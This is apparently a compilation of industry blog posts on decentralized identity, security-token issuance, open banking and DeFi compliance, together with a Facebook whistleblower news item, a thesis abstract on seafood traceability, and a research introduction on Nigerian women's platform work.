<p>IdRamp was born from years of frontline experience in enterprise identity management and service delivery. With IdRamp we wanted to reduce the pain and vulnerabilities that surround digital identity passwords, platform migration, operation, and service delivery.<br><br>The cost and resource requirements of managing and replacing identity platforms can be astronomical. Operation requires special skills and complex customization. Migrations can take years to complete and often fail. Service delivery can be slow and require premium resources. — Our experience found that adapting decentralized, Zero-Trust identity principles will reduce cost while increasing security and accelerating the speed of service delivery.<br><br>We founded IdRamp to help remove passwords, automate expensive tasks, reduce the need for advanced skills, and simplify the adoption of new solutions, all while improving overall security through decentralized Zero Trust. Instead of reinventing identity management platforms every few years with mammoth projects, organizations can use Idramp to enjoy continuous adoption of new services and solutions at the speed of business.&nbsp;</p>
<p>Decentralized verifiable credentials can easily be adapted to any service or system for advanced Zero-Trust protection and password elimination. No coding or long term platform projects are required. People appreciate the improved privacy and simplified experience of passwordless ecosystems. Security authorities appreciate the reduced data liability and the stronger protection of Zero Trust credentials.</p>
<p>Our team’s deep experience working through generations of multinational digital identity projects gives IdRamp a unique perspective. We excel at solving complex problems with simple effective solutions that improve the bottom line.</p>
<p>What are some of the products/services (Self Sovereign Identity or not) that you currently offer? Who are your target customers? What sets you apart from the competition?</p>
<p>Our premier product is the IdRamp platform. It caters to the public sector, enterprise and SMB customers across all industries. It provides service orchestration with zero-trust decentralized identity, and password elimination.</p>
<p>While IdRamp is a zero-code solution we also provide robust APIs that can be used to extend&nbsp;</p>
<p>capabilities into any custom application or ecosystem experience. The APIs offer a limitless palette of design opportunities for application development.</p>
<p>We also provide a free digital identity wallet to securely share personal information, such as education certifications, health data, or employment credentials. The wallet provides multi-wallet stewardship capabilities that allow people to manage credentials for other people or things.This feature can be used to manage family credentials, or eldercare use cases, for example.</p>
<p>IdRamp is built on open standards for interoperability. It operates automatically across any standards-based digital identity network. While the IdRamp wallet offers robust capabilities, any standards based identity wallet can be used with the IdRamp suite of tools.</p>
<p>Recently, we co-developed a series of groundbreaking IdRamp-based apps with security software provider <a href="https://bak2.life/">Bak2.life</a>. These apps include:</p>
 
 Bouncer Zoom Event Attendee Security — extends Zoom meeting security with email 2FA or verifiable credentials for all participants. 
 Return to Life — provides a simple way for organizations to offer safe access to events and facilities based on verifiable health credentials, digital ticketing or custom credentials tailored to business needs.  
 Webcast Security Portal — provides end-to-end protection and access control for multiple webcast providers, including Zero-Trust, passwordless verifiable credentials. 
 
<p>What motivated your work in decentralized identity? Why did you become a node operator?&nbsp;</p>
<p>Decentralized identity reduces data liability, increases privacy, improves security, and human experience. It is a natural compliment to our suite of Zero-Trust passwordless solutions. Decentralized design has always been core to the Idramp strategy. Adapting new standards in decentralized identity helps our customers achieve the best possible protection across their ecosystems.</p>
<p>The problems and challenges of enterprise security have been getting worse and worse over the past decade—Zero Trust identity provides much needed relief. However, the next iteration of Zero Trust will require a decentralized network to remove the need for centralized databases that carry inherent risks and increased costs. Being a Node Operator helps IdRamp provide a more comprehensive Zero Trust service to our customers.</p>
<p>Where do you see the future of Self Sovereign Identity/Decentralized Identity?</p>
<p>The need for secure identity is a high priority because the cost of a mistake with personal data can be very expensive. Terms like “SSI” and “decentralized” will eventually fade into globally accepted standard terms for digital identity. As decentralized identity becomes the preferred security standard, new threats and attacks will be developed and new Zero Trust-solutions will be required. With Idramp, organizations can stay ahead of the rapidly changing digital identity security landscape and avoid expensive technical detours that slow business and leak revenue.</p>

			 Enegra’s tokenized equity improves the liquidity of its $28Bn balance sheet via T-REX Platform<br>
 
<p>Enegra sought to provide liquidity and great UX for its investors while remaining compliant on the public blockchain. Enegra turned to Tokeny’s innovative digital asset compliance infrastructure to issue, manage and transfer its equity on the blockchain. Tokeny’s solution allows Enegra to achieve a seamless outcome without the worry of technical barriers. The highlighted results are:</p>

		 
	 
      <p>Improved liquidity</p>      <p>Global and automated compliance</p>      <p>Zero transaction fees</p>                              We tokenized our equity to improve liquidity. And, now that the technology is available for faster, cheaper, and compliant transactions on the blockchain, we wanted our investors to take advantage of it. Polygon and Tokeny provided the complete infrastructure we needed to do so, and we are extremely pleased with the results.  Matthew AverayManaging Director &amp; CEO at Enegra        
	 
		 
			 Introduction 
<p><a href="https://www.enegragroup.com/">Enegra</a> was established in Malaysia in 2011, with a mission to enable mid-tier commodity miners in emerging markets to compete globally, Enegra achieves this through its world-class trading expertise, risk management, logistics, and governance – thereby delivering economic security among mid-tier mining communities whose lack of trading expertise often leaves them exploited on price.</p>
 Why Enegra tokenized its equity 
<p>Earlier 2019, Enegra’s management team explored asset tokenization, and team was fascinated by the concept and the advantages it brings to the company as an issuer, along the liquidity benefits to its investors. The following benefits meet exactly what Enegra sought to achieve for its new equity offering:</p>
 
 Improved liquidity 
 Automated compliance 
 Real-time cap table 
 Low administration and asset transfer costs 
 Control securities 
 Directly connect with investors 
 
 Compliantly tokenizing assets since 2019 
<p>Later in 2019, Enegra embarked on a search for a suitable tokenization platform to issue and manage its equity-backed security tokens on a public blockchain in a compliant manner, along with the necessary controls in place. Tokeny’s <a href="https://tokeny.com/t-rex-platform/">T-REX Platform</a> caught Enegra’s attention for two main reasons:</p>
 
 First: it leverages the public blockchain while bringing compliance and control. It achieves this through a unique <a href="https://tokeny.com/onchain-finance-leveraging-decentralized-technology-for-capital-markets-infrastructure/">onchain compliance approach</a> by whitelisting of digital identity not the wallet for maximum security, e.g: when investors lose their wallets, issuers can recover the tokens for them. 
 Second: it provides the most advanced platform (120+ functions) with the best user experience in the market. 
 
<p>In September 2019, Enegra issued its equity-backed EGX security tokens via Tokeny’s T-REX Platform on Ethereum. From then on, Enegra has been managing its security tokens and investors through the same platform.</p>
 Improving the UX further: say goodbye to gas fees 
<p>Earlier this year, Tokeny enhanced its blockchain layer to start supporting Polygon, a scalable layer 2 solution, to provide a faster, cheaper and compliant infrastructure for its customers. In addition, <a href="https://tokeny.com/tokeny-has-solved-the-problem-of-gas-fees/">the Gas Tank solution</a> was introduced to make the transaction fees free for platform users, eliminating infrastructure costs and troublesome processes.</p>
<p>To enhance the user experience of its security token holders, Enegra upgraded its services with Tokeny last month:</p>
 
 Migrated security tokens to Polygon&nbsp; 
 Implemented the Gas Tank solution 
 
<p>Enegra and its security token holders can now take advantage of fast, free and compliant transactions which ultimately improves liquidity and accessibility of the assets.&nbsp;</p>

The Facebook&nbsp;problem More like Facebook First, Photo: Maurizio&nbsp;Pesce<p>It hasn’t been the greatest month for Facebook. The WSJ published <a href="https://www.wsj.com/articles/the-facebook-files-11631713039">a series of scathing exposees</a> highlighting the kinds of choices the company’s leadership regularly makes when faced with the option to expand profits versus “do the right thing.” (Which then doesn’t match their public proclamations of “doing better.”)</p><p>That in and of itself isn’t going to be much of a surprise to most people. The Facebook brand doesn’t have a ton of credibility these days. But seeing the nitty gritty details is still jarring — especially when <a href="https://www.wsj.com/articles/facebook-knows-instagram-is-toxic-for-teen-girls-company-documents-show-11631620739?mod=article_inline">we’re talking about children’s mental&nbsp;health</a>.</p><p>We now know who we owe these nitty gritty details, too — a company whistleblower known as “Sean.” Here actual name is Frances Haugen, <a href="https://www.nytimes.com/2021/10/03/technology/whistle-blower-facebook-frances-haugen.html">according to a New York Times&nbsp;report</a>.</p><p>In any case, Matt Levine has <a href="https://www.bloomberg.com/opinion/articles/2021-10-04/facebook-whistleblower-shows-a-shift-in-shareholder-values-away-from-profits">a straightforward breakdown of the situation</a>:</p><blockquote>Okay fine. Facebook is a for-profit company with obligations to its shareholders, and at various points it has a choice between doing pro-social things that are expensive or doing anti-social things that maximize its profits. Sometimes (she asserts, and I don’t particularly disagree) it chooses profit over public good. This is not a huge surprise, incentives being what they are, but it is good for policymakers and the public to know about the particular cases. It is good because, if we know about these choices, we can make informed decisions about regulation and enforcement. If Facebook sometimes chose to break the law to maximize profit, then regulators should punish it. If everything that Facebook does to maximize profits is legal, but some of it is horrible, then we should write new laws to make the horrible stuff illegal. If Facebook does things that are bad for the world then policymakers should try to make it stop. Basic&nbsp;stuff.</blockquote><p>That’s the inherent issue with a top-down platform that’s incentivized to maximize engagement and sharing in order to leverage its users’ data by serving them ads. Sometimes you need regulators to come in to whip them into&nbsp;shape.</p><p>Here comes the shameless plug. With Facebook, Messenger, WhatsApp, and Instagram all down today, why not try <a href="https://medium.com/global-id/globalid-messaging-is-end-to-end-encrypted-by-default-9c5d5e7d199d">a bottom-up messenger that preserves your digital privacy and that is end-to-end encrypted by default</a>? (Shameless plug idea courtesy of GlobaliD Developer Support Engineer Paul&nbsp;Keen.)</p> 2. Facebook shelves Instagram Kids initiative <p>But sometimes, all you need is a bright enough light. After the WSJ<a href="https://www.wsj.com/articles/facebook-documents-instagram-teens-11632953840"> published Facebook’s internal documents about Instagram and teens</a>, the company has dutifully shelved the&nbsp;project.</p><p>Here’s <a href="https://www.axios.com/instagram-pause-kids-platform-scrutiny-4f42fa4f-4dcd-411f-b44a-33ef5f18436e.html">Axios</a>:</p><blockquote>Instagram announced Monday that it is pausing its plans to develop a version of its platform for children under&nbsp;13.</blockquote><blockquote>Why it matters: Facebook has received backlash since the Wall Street Journal published a report that showed the company knew its Instagram app is harmful to teenagers.</blockquote><blockquote>…</blockquote><blockquote>By the numbers: The Journal revealed that Facebook was aware that, among teenage users, 13% of British users and 6% of American users traced the desire to kill themselves to Instagram.</blockquote><blockquote>What they’re saying: “While we stand by the need to develop this experience, we’ve decided to pause this project. This will give us time to work with parents, experts, policymakers and regulators, to listen to their concerns, and to demonstrate the value and importance of this project for younger teens online today,” Mosseri&nbsp;said.</blockquote><blockquote>…</blockquote><blockquote>What’s next: The Senate is scheduled to hold a hearing on Thursday to address “Facebook’s research into the impact of its apps on young audiences, its actions to address threats to these users, and policy considerations to safeguard kids&nbsp;online.”</blockquote><p>Whistleblower Frances Haugen is also scheduled to testify before the Senate tomorrow.</p><p>Relevant:</p>  <a href="https://www.wsj.com/articles/facebook-documents-instagram-teens-11632953840">Facebook’s Documents About Instagram and Teens, Published</a>  <a href="https://www.axios.com/instagram-pause-kids-platform-scrutiny-4f42fa4f-4dcd-411f-b44a-33ef5f18436e.html">Instagram pauses development of platform for&nbsp;kids</a>  <a href="https://www.axios.com/facebook-whistleblower-60-minutes-d2fba3d9-5fef-4aef-b2f8-6244e215b1ed.html">Facebook whistleblower’s “60 Minutes” interview puts face to bombshell allegations</a>  <a href="https://www.nytimes.com/2021/10/03/technology/whistle-blower-facebook-frances-haugen.html">Whistle-Blower Says Facebook ‘Chooses Profits Over&nbsp;Safety’</a>  Via RD — <a href="https://www.washingtonpost.com/technology/2021/09/26/ask-company-delete-personal-data/">Companies are hoarding personal data about you.

         A Case Study of Norwegian Salmon for the Chinese Market 
<p>Master thesis by Andreas Høieggen Steensæth</p>
<blockquote>
<p>I also want to thank Stephan Nilsson, CEO and founder of UNISOT for introducing me to<br>
potential interview respondents, for expert advice and taking the time for nearly weekly<br>
follow-up meetings in which he was available for questioning and advice. Additionally, I<br>
would like to thank Torje Vingen Sunde, CFO of UNISOT, for also participating in these<br>
meetings, offering suggestions and giving feedback throughout the process.</p>
</blockquote>
<p>In a dynamic and highly globalized world supply chains are complex and demanding to manage, and it is difficult to achieve full transparency and traceability. In China, a nation with substantial history of food scandals, the outbreak of covid-19 has recently increased the attention toward food safety and traceability.</p>
<p>This thesis aims to identify supply chain and traceability challenges Norwegian seafood is faced with in the Chinese market, the potential instruments that can meet the challenges, and how blockchain technologies potentially can meet the challenges. In order to accomplish this, there has been conducted a literature research that has examined the seafood supply chain, the Chinese market, traceability and blockchain technologies. Furthermore, for the primary research, there has been conducted semi-structured interviews with five informants with expert knowledge of Norwegian seafood, the Chinese market, and/or blockchain technologies, and a supply chain map has been constructed.</p>
<p>The findings identified 14 challenges related to supply chain, traceability and political areas. In order to assess how blockchain can improve several of the challenges, the challenges “policies”, “participation”, and “tampering” were selected to illustrate how blockchain technology can contribute to solving these. It was concluded that the unique properties of blockchain technology has the potential to meet several of the challenges identified related to supply chain management and implementation of traceability.</p>

 Country Landscape Review <p>Authors: Raymond Onuoha (<a href="mailto:ronuoha@lbs.edu.ng">ronuoha@lbs.edu.ng</a>), Olayinka David-West (<a href="mailto:ydavid-west@lbs.edu.ng">ydavid-west@lbs.edu.ng</a>), Renée Hunter (<a href="mailto:rhunter@v4w.org">rhunter@v4w.org</a>)</p><p>We are starting a new research project — and we’d like you to join us on the journey. Over the course of 2021, Lagos Business School and Value for Women, in partnership with Caribou Digital, and with the support of the Mastercard Foundation, aim to understand the experiences of young women working or trading through digital platforms in Nigeria. We are particularly interested in uncovering whether and how such activities contribute to their economic empowerment, and the extent to which COVID-19 has impacted this. The study also builds on previous work on <a href="https://medium.com/caribou-digital/platform-livelihoods-working-trading-renting-and-engaging-in-digital-marketplaces-b144ffcc1141">platform livelihoods</a> by both Caribou Digital and researchers at Qhala in Kenya. It is also part of wider ongoing research on <a href="https://medium.com/caribou-digital/how-can-we-make-platform-livelihoods-better-for-young-women-especially-during-and-after-covid-19-696b3974bf61">platforms livelihoods and women</a> that includes additional studies in <a href="https://medium.com/caribou-digital/researching-gender-and-platform-livelihoods-in-ghana-9359ec3f55b0">Ghana</a> and&nbsp;<a href="https://medium.com/caribou-digital/women-and-platform-livelihoods-in-kenya-the-impact-of-covid-19-954d6b073997">Kenya</a>.</p> (Un)employment in Nigeria: A need to look beyond the formal&nbsp;sector <p>Nigeria is Africa’s largest economy, with over 200 million people, millions of whom are currently underutilized. Despite several government interventions to drive economic activity and consequently create (formal) jobs, Nigeria’s unemployment rate has continued to rapidly climb in the last decade. Although the data does depend on the exact definition of “unemployment rate,” unemployment rose from <a href="https://www.ng.undp.org/content/nigeria/en/home/library/human_development/undp-nigeria-annual-report-2016.html">3.5% in 2006 to 33% in 2020</a>; The country currently <a href="https://www.nigerianstat.gov.ng/elibrary.?queries[search]=unemployment">ranks</a> 164 out of 182 in global unemployment.</p><p>A closer look at the numbers shows that some groups — especially women — are harder hit than others in terms of obtaining employment. Overall, 23% of the labor force work only 20–39 hours per week, and 16% work less than 20 hours per week. Delving into different age ranges and genders provides an even more nuanced picture: youth (15–34 years) are faced with the highest unemployment (45%), and 35% of women are unemployed, with an additional 24% being underemployed (20–39 hours per week). The higher-than-average figures for these social groups indicate that the talents of especially young women are currently underutilized, making online opportunities all the more interesting and important for these&nbsp;groups.</p><p>Figure 1 presents a breakdown of the labor population.</p>Figure 1: Nigeria’s Labour Statistics, Q4 2020. Source: NBS The categories in this figure mean the following:<br>● Working age range: 15–64 years<br>● Labour force: members of the working age that are able and willing to work<br>● Fully employed: worked 40+ hours per week<br>● Underemployed: worked between 20–39 hours per&nbsp;week<p>Some of the barriers keeping (young) women out of employment include traditional gender roles and biases, lower literacy rates, and lower rates of access to mobile phones and internet connectivity. For example, 49% of men (compared to 34% of women) agree that a university education is more important for a boy than for a girl, and 74% of men (compared to 55% of women) agree that, when jobs are scarce, <a href="https://www.worldvaluessurvey.org/WVSDocumentationWV7.jsp">men should have more right to employment than women</a>. Gaps in educational attainment start long before university, with <a href="https://data.worldbank.org/indicator/SE.ADT.1524.LT.FE.ZS?locations=NG">literacy rates for young women </a>in Nigeria at 68%, compared to young men at 82% — 1.2 times as high. Access to <a href="https://www.gsma.com/mobilefordevelopment/wp-content/uploads/2020/05/GSMA-The-Mobile-Gender-Gap-Report-2020.pdf">information and learning opportunities</a> is hampered by gaps in mobile internet usage, which for women in Nigeria stand at 38%, in contrast to that for men at 54% — 1.4 times as&nbsp;high.</p><p>With the limited scope of the formal sector to employ people in general, individuals are looking elsewhere for their livelihoods. This is not new; in fact, 93% of working Nigerians are <a href="https://www.ilo.org/wcmsp5/groups/public/---dgreports/---dcomm/documents/publication/wcms_626831.pdf">informally employed</a> (women more than men). The increasing number of digital platforms provides an attractive avenue for individuals to earn a livelihood outside the parameters of formal employment.</p> Online platforms: Potential to fill women’s livelihood gaps? <p>Nigeria’s digital economy has seen rapid growth in the last five years. As of 2019, there were an estimated 138 <a href="https://cenfri.org/wp-content/uploads/07.2020_Nigeria-Digital-platform-landscape.pdf">digital platforms</a> active in the country (of which 80% are homegrown). Freelancing platforms are the most common (35), followed by marketplace platforms (32) and ride-hailing apps (21). These digital platforms act as virtual marketplaces that connect buyers and sellers of goods and services. Determining the number of individuals earning a livelihood through these platforms is difficult, due to challenges in definitions and data collection. Recent estimates range from as little as<a href="https://cenfri.org/wp-content/uploads/Policy-options-for-regulating-platform-work_Nov-2020-2.pdf"> 0.01% of the labor force</a> to almost <a href="https://cenfri.org/wp-content/uploads/i2i-ADP-infographic-2018.pdf">three million individuals</a>. When individuals conducting business via social platforms (such as WhatsApp, Facebook, or Instagram) are included, estimates are even&nbsp;higher.</p><p>The key drivers of growth within the Nigerian platform ecosystem include a large, young, and entrepreneurial population, as well as an active ecosystem that incorporates digital start-ups (estimated up to <a href="https://www.isc.hbs.edu/Documents/resources/courses/moc-course-at-harvard/pdf/student-projects/Lagos_ICT_2017.pdf">700</a>), incubators, and venture capital firms. This is particularly true in Lagos, which generates the most economic activity in the country — accounting for <a href="https://www.isc.hbs.edu/Documents/resources/courses/moc-course-at-harvard/pdf/student-projects/Lagos_ICT_2017.pdf">25% of national GDP</a> and <a href="https://datareportal.com/reports/digital-2021-nigeria">18%</a> of all <a href="https://nairametrics.com/2021/03/30/fct-lagos-3-other-states-gain-highest-internet-subscribers-in-2020/">Nigerian internet users</a>. While other urban areas are also seeing an uptick in the use of digital platforms, rural areas remain behind due to a digital divide underpinned by lack of internet access, affordability, and digital literacy and&nbsp;skills.</p><p>Nigerian women have been moving towards online livelihoods. A demand-side survey conducted between 2017 and 2018 shows that, among internet users, <a href="https://media.africaportal.org/documents/2019_After-Access_Africa-Comparative-report.pdf">women are 1.6 times more likely</a> than men to earn income via online means. In and of itself, this is interesting, given the higher levels of economic participation among men generally, but it is even more so when compared to data from other countries in Africa, which shows that this trend is generally reversed elsewhere, as observed on microwork platforms (see Table 1). In addition to the imperative of finding livelihoods outside of traditional means (as described above), <a href="https://cenfri.org/wp-content/uploads/FINAL_Nigeria-e-hailing-note_Aug-2020.pdf">reasons for preferring online work</a> include flexibility, the opportunity to work from home, and the potential for significantly higher earnings.</p><p>However, gendered gaps and dynamics remain. First, it is important to remember that the figures in Table 1 refer to the percentage of internet users that earn a livelihood via online platforms. Given the prevailing digital divide (for one, according to the <a href="https://www.gsma.com/r/wp-content/uploads/2021/06/The-Mobile-Gender-Gap-Report-2021.pdf">GSMA</a>, 56% of men compared to only 40% of women in Nigeria make use of mobile internet), women have more hurdles to overcome before they are able to access and productively use mobile internet, and subsequently online platforms. Moreover, <a href="https://opendocs.ids.ac.uk/opendocs/bitstream/handle/20.500.12413/14727/597_Gender_Roles_in_Nigerian_Labour_Market.pdf?sequence=1">women’s (analogue) employment</a> is concentrated in economic sectors such as agriculture, small-scale commerce, and the informal sector. Initial cross-country evidence shows that <a href="https://cenfri.org/wp-content/uploads/i2i-ADP-infographic-2018.pdf">similar differences </a>might remain when moving to online livelihoods.</p><p>Table 1: Digital Platform microwork participation in select African countries disaggregated by gender. Source: Gillwald and Onkokame&nbsp;(2019).</p><p>We intend to further investigate the potential of online platforms to meet the need for more income-generating opportunities for young Nigerian women. We think of women’s (economic) empowerment in digital platforms as the relative ease with which women have access to these platforms and mobilize them for sustainable socio-economic capital.</p><p>Online platforms might contribute to women’s (economic) empowerment through facilitating income-generation, coupled with flexibility and autonomy, which provides more opportunities for women to be self-sufficient and combine a decent livelihood with their other responsibilities. In Nigeria, with the impact of the COVID-19 pandemic, women entrepreneurs (mostly low-income) working in open markets had to <a href="https://www.womensworldbanking.org/insights-and-impact/covid-19-unlocks-e-commerce-digital-finance-among-low-income-women-in-nigeria/">pivot their trading activities to online platforms</a>, even though many were previously unbanked and undigitized. This shift became imperative because of the increased migration to online shopping. For these women, going digital was a survivalist option to retain their clientele and potentially expand their operations during the lockdown.</p><p>However, studies show that some digital platforms exploit online earners, which might further exacerbate gendered power dynamics. For example, <a href="https://cenfri.org/wp-content/uploads/Policy-options-for-regulating-platform-work_Nov-2020-2.pdf">certain platform practices</a>, such as the ability to block users due to bad reviews, put earners at a significant disadvantage. And online environments are not removed from the biases prevalent in offline environments;<a href="https://www.platformlivelihoods.com/qydel2020/"> forthcoming research by Caribou Digital</a> finds that freelancers in the Global South can find it beneficial to pretend to be based in Europe or the United States, as they find it increases their likelihood of getting jobs. We might expect to see similar biases impact the online livelihoods of women (remember that almost ¾ of Nigerian men agree that jobs should go to men when they are in high demand!).</p><p>Different stakeholders have different roles to play in creating opportunities for women’s online livelihoods. State interventions, for example, can set <a href="https://cenfri.org/wp-content/uploads/Policy-options-for-regulating-platform-work_Nov-2020-2.pdf">regulatory requirements for platforms</a> and apply <a href="https://doi.org/10.14662/IJPSD2017.025">interventions to labor relations</a> overall. In Nigeria the <a href="http://socialprotectionng.com/share/Nigeria%20National%20Social%20Protection%20Policy%20-%20Draft%202016.pdf">2016 National Social Protection Policy</a> establishes a gender-sensitive and age-appropriate framework for enhancing women livelihoods, though it does not recognize online work; the <a href="https://www.decentjobsforyouth.org/commitment/190">Nigeria Youth Employment Action Plan (NYEAP)</a> targets young people within the age range of 18–35 for employment creation in critical sectors of the economy; and the <a href="https://nigerianwomentrustfund.org/wp-content/uploads/National-Gender-PolicySituation-Analysis.pdf">National Gender Policy of 2006</a> aims to mainstream women’s rights across economic sectors. Thus far, however, these policies have not significantly shifted private sector practices from traditional values and power dynamics.</p><p>Online platforms can apply a gender lens to their activities to de-bias their structures and provide more protection to the individuals using them. While work has been done to establish international standards on best practices for online platforms (see, for example, the work done by the <a href="https://fair.work/en/fw/homepage/">Fairwork Foundation</a>), to our knowledge this is not yet prevalent through a gender&nbsp;lens.</p><p>The development and research communities have roles in unearthing evidence, bringing parties together to learn, and making recommendations! This is precisely where our current project comes&nbsp;in.</p> Our approach  Our key questions are: <p>1) In what ways might platform work empower&nbsp;women?</p><p>2) How can we make platforms work better for&nbsp;women?</p><p>We will undertake qualitative research to answer these questions. This will consist of focus groups and in-depth interviews with women earning livelihoods through online channels — both as gig workers and micro-entrepreneurs — and in-depth expert interviews with ecosystem stakeholders, including civil society, platforms, digital finance providers, regulators, and other private sector&nbsp;actors.</p><p>We will use a participatory video storytelling method to dig deeper into the lived experiences of select female workers by giving them the tools (a phone, video training, and mentoring) to tell their story. See Caribou DIgital’s previous<a href="https://www.platformlivelihoods.com/covid-19-video-project/"> participatory video storytelling project </a>with gig&nbsp;workers.</p><p>We will also engage digital platforms directly through a Gender Self-Assessment Survey, conducted via <a href="https://www.v4w.org/gendersmartnexus/">Value for Women’s Gender Smart Nexus</a>.

<p>Mastercard’s Jess Turner, EVP New Digital Infrastructure and Fintech, was featured in PYMNTS The Way Payments Are Now Done eBook discussing how account opening needs to follow customer expectations to provide the best experience possible. You can read the full report at <a href="https://securecdn.pymnts.com/wp-content/uploads/2021/09/2021-10-eBook-Q3-Responses-V2-mpc.pdf">PYMNTS</a>, but here’s what she had to say:&nbsp;</p>
<p>As we contend with in-person restrictions, the demand for and use of digital financial services has grown. Mobile banking, account opening or making real-time payments are now not only our first reflex but often a necessity. <a href="https://www.mastercard.com/news/research-reports/2020/the-global-state-of-pay/">Mastercard’s 2020 Global State of Pay</a> study found 73% percent of consumers and 67% of small businesses had used mobile banking apps to manage their finances and make payments in the past 12 months, and 53% of consumers said they were using them more now than they had before.</p>
<p>Consumers want flexibility in how they manage their finances, and true financial services innovators are delivering experiences that provide this choice. Opening checking accounts online is increasingly part of a consumer’s normal payments routine, and it is powered by open banking, which has also seen significant acceleration during COVID-19 and is expanding globally. Nearly two-thirds (64%) of the checking accounts opened during the height of the pandemic were submitted either online or on a mobile device with more than eight in ten banking app users reporting the experience was “easier than they thought.” That’s largely due to open banking.</p>
<p>Digital account opening is here to stay, and consumers expect to open an account in seconds. But issues like manual uploads and micro-deposits add delays. Open banking introduces new ways for financial institutions and apps to verify account ownership and authenticate credentials for opening and funding accounts. The balance of risk, compliance and customer experience is delicate – efficiency can’t compromise fraud prevention. Trust is critical in our hyper-connected digital environment and the consumer must be at the center of control, ensuring greater transparency.</p>
<p>That’s why we have a solution that provides secure, lightning-fast account verification. Mastercard’s open banking network is removing friction points in the account setup, onboarding and funding process. Open banking introduces new ways for financial institutions to verify account ownership and authenticate credentials for opening and funding that include account owners, account details, and balances that boost sign-ups and reduce abandonment. The connectivity is also useful when customers have an existing relationship with a financial institution but want to move money or add services. Data services help financial institutions verify account details and balances in milliseconds while moving money accurately and securely.&nbsp;&nbsp;</p>
<p>With the rapid emergence and global expansion of open banking, the money experience will never be the same. At Mastercard, we are redesigning our network to power the future of payments and services. A global open banking network, coupled with our existing multi-rail expertise, empowers our partners to better serve consumers and their changing expectations with digital experiences.</p>

<p>The Future Now Problem blurs the lines between what is feasible NOW and what is only going to be possible in the FUTURE.</p>
<p>NOTE: This article is going to evolve and be updated. I likely won’t announce all of the changes.</p>
<p>The decentralized identity/SSI space is particularly good at creating and exacerbating this problem. We’re working through, with several clients, planning production deployment and the Future Now Problem keeps cropping up. There are so many issues here that I could probably write a small book – though I won’t .</p>
<p>For a quick briefer I recorded a quick Loom video – that I will replace with newer versions as the message gets crisper:</p>
  
<p>When the idea of what is available right NOW is blurred among the ideas of the FUTURE,&nbsp;you can’t differentiate between what is feasible TODAY from what is not ready for prime time.</p>
<p>As an example, there are ongoing issues in many of the “standards” that are driving the industry. Most of the standards haven’t been passed and if they have, they have enough vaguaries that compliance is easy but interoperability is a non-starter. So the sharp projects are working through many of the interop and other issues in their own ecosystems and making progress. In order to do that, they are critically examining where the Future Now Problem has led them astray.</p>
<p>This takes hard work and the ability to operate in a trusted environment. We’re happy to help our clients understand what is NOW and what is FUTURE (and how to plan for and influence that future).&nbsp;</p>

 SUMMARY 



  Since Bitcoin’s inception, blockchain technology has radically transformed finance.&nbsp;  However, none of the new-world benefits of Decentralized Finance (DeFi) may be sustained without adherence to evolving regulatory standards.&nbsp;  Civic CEO Chris Hart explores the past, present and future of DeFi.  



 In banks we trust(ed) 



<p>Not long ago, when someone talked about finance, there was no need to qualify what type of finance they were referring to. Centralized Finance, CeFi now, was the only option. This was true not because innovative ideas were lacking, but because large, central, state-sponsored or legacy financial institutions held all the cards.&nbsp;</p>



<blockquote><p>The structural friction and inherent inequities controlling financial systems resisted the standing up of a new bank, exchange or regulated entity, and prevented all but the most advantaged institutions from participating in anything other than a transactional relationship.&nbsp;</p></blockquote>



<p>For example, when you look at securities trading in the US, most exchanges are owned by a precious few companies, including the Intercontinental Exchange, which is the NYSE’s parent company, Cboe Global Markets or Nasdaq.&nbsp;</p>



<p>To be sure, there are a few upstart new entrants in the last couple of years, but mostly the exchanges have changed little in the past couple of decades.</p>



 But blockchain and crypto change all that, don’t they? 



<p>With the advent of blockchain and crypto currencies, what is striking is how much has changed, and how so many things still remain the same.</p>



<p>In centralized crypto exchanges (CEX), as in traditional finance (TradFi), enforcement of regulatory compliance rules like Know Your Customer (KYC) and Anti Money Laundering (AML), and the structural friction inherent in the granting process of licenses are the mechanisms by which winners and losers have emerged. And with that, the emergence of CeFi for the crypto world has largely occurred.&nbsp;</p>



<blockquote><p>A few large crypto institutions hosting central limit order books, lending and other financial services now cater to millions of users worldwide.</p></blockquote>



<p>In effect, CeFi for crypto took the legacy exchange model, albeit with the addition of broker functionalities and removal of the need for clearinghouses, and rebooted it for a new asset class:</p>



  



 Disintermediation of finance: why are we walking but not yet running? 



<p>In many ways, the blockchain developments of the last 13 years have rewritten the rulebook, enabling permissionless innovation of Decentralized Exchanges (DEXs) such as Automated Market Makers (AMMs) and decentralized central limit order books, Lending Protocols, and the advent of DeFi in general. These products and services, among others, have provided tremendous value to their users.&nbsp;</p>



<p>DeFi’s thesis is particularly well suited to replacing important aspects of the centralized finance stack: trading logic (smart contracts / protocols), custody (non-custodial wallets), and security (on-chain elimination of counterparty risk / auditable contracts):</p>



  



<p>However, in other important ways <a href="https://www.wsj.com/articles/cryptos-defi-projects-arent-immune-to-regulation-secs-gensler-says-11629365401">the rules remain the same</a> for compliance, regulatory oversight and capital markets. The argument goes that it remains crucial to ensure basic safeguards remain in place to curtail bad actors and to provide guardrails for retail investors for whom loss of funds could be monumental.&nbsp;</p>



<blockquote><p>What is clear, is that the days of treating regulatory compliance as irrelevant to DeFi, or imagining that somehow the blockchain paradigm exempts the new breed of Fintechs from basic checks like KYC, are coming to a close.</p><p></p></blockquote>



<p>It is true that the more complicated offerings like derivatives (i.e. futures, options) and high leverage trading require a degree of sophistication, but should elite banks decide who gets to participate? And why should those traders and investors who want to participate in DeFi be blocked from doing so, assuming appropriate guardrails are in place? At Civic we believe in the power of DeFi and the more level playing field it provides.</p>



 Is there a way to get the best of both worlds? 



<p>There are good reasons why KYC and AML guidelines need to be followed. However, until now the process of disintermediation of the traditional financial services stack has not allowed for both DeFi structures and compliance frameworks to enable the next wave of innovation.</p>



<p>Civic and our partners are working to change that with the introduction of Civic Pass:</p>



  



<p>With Civic Pass, our partners can move towards meeting KYC &amp; AML requirements with Civic’s SaaS compliance tools. These tool allows for participation with known counterparties and permissioned DeFi pools of liquidity.</p>



<blockquote><p>Ultimately, Civic’s vision is to provide the identity and compliance piece of the DeFi puzzle. We want to enable the complete disintermediation of CeFi and, more broadly, foster the adoption of identity and compliance structures for any on-chain project that needs them.</p></blockquote>



<p>At Civic we believe that the power of decentralization can be coupled with an on-chain identity layer in a way that adheres to regulatory requirements, accelerates the pace of innovation, enables the next 100 innovative blockchain companies and protects individual privacy. Civic is excited to continue to work with these innovators and regulators as we work towards true decentralization of the DeFi governance layer.</p>



<p>If you want to get a glimpse of what that future looks like, check out the first implementation of the Civic Pass solution with <a href="http://dex.solrise.finance/">our launch partner</a>.</p>

<p>Introduction</p>
